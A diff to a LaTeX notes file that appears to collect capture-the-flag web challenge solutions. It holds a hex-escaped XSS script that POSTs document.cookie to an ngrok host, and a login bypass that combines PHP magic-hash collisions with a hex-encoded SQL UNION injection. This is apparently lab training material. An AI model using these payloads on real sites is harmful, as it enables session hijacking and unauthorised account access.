@@ -38,3 +38,15 @@ This demonstrates the system uses gnuplot (acually, wrapped with PyGnuplot).
 
 \section{WS_3.07 - jpasta}
 \texttt{\x3cscript\x3efetch\x28\x22https://7f4f-109-54-123-152.ngrok-free.app/test\x22,\x7bmethod:\x22POST\x22,body:document.cookie\x7d\x29\x3c/script\x3e}
+
+\section{J20_WS_2.01 - jacksecurity}
+Solution: PHP "hash collision"
+
+See: https://github.com/spaze/hashes/blob/master/sha1.md
+
+MD5: 240610708; SHA-1: aaroZmOk.
+
+Interpet with Py: \texttt{b"' UNION SELECT '24061','0708' # ".hex()} -> \texttt{2720554e494f4e2053454c45435420273234303631272c273037303827202320}
+
+User: \texttt{\' UNION SELECT 0x2720554e494f4e2053454c45435420273234303631272c273037303827202320 # } \\
+Pass: \texttt{aaroZmOk}
